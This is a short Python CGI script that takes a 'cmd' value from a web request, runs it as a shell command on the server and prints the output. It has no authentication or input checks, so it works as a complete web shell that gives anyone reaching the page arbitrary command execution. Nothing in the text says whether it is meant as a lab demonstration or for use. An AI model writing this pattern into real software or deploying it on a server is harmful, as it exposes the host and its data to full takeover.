#!/usr/bin/python3
import cgi
import subprocess

myData = cgi.FieldStorage()
myCommand = myData.getvalue("cmd")

print("Content-Type:text/html")
print()

print("Command entered: " + myCommand)
print("Output: ")
print(subprocess.getoutput(myCommand))
